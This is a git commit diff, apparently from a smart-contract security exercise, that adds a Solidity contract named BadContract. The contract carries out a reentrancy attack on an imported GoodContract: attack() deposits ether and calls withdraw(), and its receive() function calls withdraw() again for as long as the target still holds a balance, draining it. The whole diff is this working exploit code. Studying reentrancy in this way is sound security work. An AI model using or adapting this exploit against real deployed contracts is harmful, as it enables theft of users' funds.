b52fef490e14e97df6226004ec9f18ed14f554bb
snmsndhu <107799845+snmsndhu@users.noreply.github.com>
2022-12-15 08:53:32 -0500

    Bad- Smart-Contract

--- contracts/BadContract.sol
+++ contracts/BadContract.sol
@@ -1,6 +1,23 @@
-//SPDX-Licence-Identifier: MIT
+// SPDX-Licence-Identifier: MIT
 pragma solidity ^0.8.4;
 
+import "./GoodContract.sol";
+
 contract BadContract {
+ GoodContract public goodContract;
+ constructor(address _goodContractAddress) {
+    goodContract = GoodContract(_goodContractAddress);
+ }
+
+ receive() external payable {
+    if(address(goodContract).balance > 0){
+        goodContract.withdraw();
+    }
+ }
+
+ function attack() public payable {
+    goodContract.addBalance{value: msg.value}();
+    goodContract.withdraw();
     
+ }
 }
